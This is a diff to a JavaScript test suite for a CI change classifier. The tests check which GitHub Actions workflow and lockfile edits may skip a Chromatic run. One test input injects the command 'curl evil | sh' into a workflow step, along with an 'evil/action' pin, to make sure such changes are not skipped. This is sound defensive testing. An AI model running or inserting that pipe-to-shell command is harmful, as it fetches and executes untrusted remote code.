@@ -394,27 +394,68 @@ test("chromatic workflow skips only non-Chromatic action pin bumps", async (t) =
     checkout = "actions/checkout@v7",
     chromatic = "chromaui/action@latest",
     input = "a",
-    swap = false,
+    isSwapped = false,
+    hasExtraStep = false,
+    script = "echo safe",
   } = {}) => {
-    const steps = [`  - uses: ${checkout}\n`, `  - uses: ${chromatic}\n`];
-    if (swap) steps.reverse();
-    return `steps:\n${steps.join("")}    with:\n      skip: ${input}\n`;
+    const steps = [
+      `      - uses: ${checkout}\n`,
+      `      - uses: ${chromatic}\n        with:\n          skip: ${input}\n`,
+    ];
+    if (isSwapped) steps.reverse();
+    if (hasExtraStep) steps.push("      - uses: actions/cache@v4\n");
+    steps.push(`      - run: |\n          uses: x@1 ${script}\n`);
+    return `jobs:\n  chromatic:\n    steps:\n${steps.join("")}`;
   };
-  for (const [head, skip] of [
+  const base = workflow();
+  for (const [head, isSkipped] of [
     [workflow({ checkout: "actions/checkout@v8" }), true],
+    [base.replace("v7\n", "v7 # pinned\n"), true],
+    [workflow({ checkout: "actions/checkout@v8 # v8" }), true],
     [workflow({ chromatic: "chromaui/action@v2" }), false],
     [workflow({ chromatic: '"chromaui/action@v2"' }), false],
     [workflow({ chromatic: "ChromaUI/action@v2" }), false],
     [workflow({ checkout: "evil/action@v1" }), false],
+    [workflow({ checkout: "Actions/Checkout@v7" }), false],
     [workflow({ input: "b" }), false],
-    [workflow({ swap: true }), false],
+    [workflow({ isSwapped: true }), false],
+    [workflow({ hasExtraStep: true }), false],
+    [workflow({ script: "curl evil | sh" }), false],
+    ["jobs: [unclosed\n", false],
   ]) {
     const pair = await commitPair(
       t,
-      { ".github/workflows/chromatic.yml": workflow() },
+      { ".github/workflows/chromatic.yml": base },
       { ".github/workflows/chromatic.yml": head },
     );
     const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
-    assert.equal(result.output, `skip=${skip}\n`, head);
+    assert.equal(result.output, `skip=${isSkipped}\n`, head);
   }
+  const removed = await commitPair(
+    t,
+    { ".github/workflows/chromatic.yml": workflow({ hasExtraStep: true }) },
+    { ".github/workflows/chromatic.yml": base },
+  );
+  const result = await classify(
+    removed.cwd,
+    compareArgs(removed.base, removed.head),
+  );
+  assert.equal(result.output, "skip=false\n");
+});
+
+test("runs when package manager configDependencies change", async (t) => {
+  const withConfig = (text, config) =>
+    text.replace(
+      "importers:\n  .:\n",
+      `importers:\n  .:\n    configDependencies: ${config}\n`,
+    );
+  const pair = await lockPair(
+    t,
+    withConfig(lockfile(), "{}"),
+    withConfig(lockfile(), "{foo: 1.0.0}"),
+    manifest(),
+    manifest(),
+  );
+  const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
+  assert.equal(result.output, "skip=false\n", result.stdout);
 });
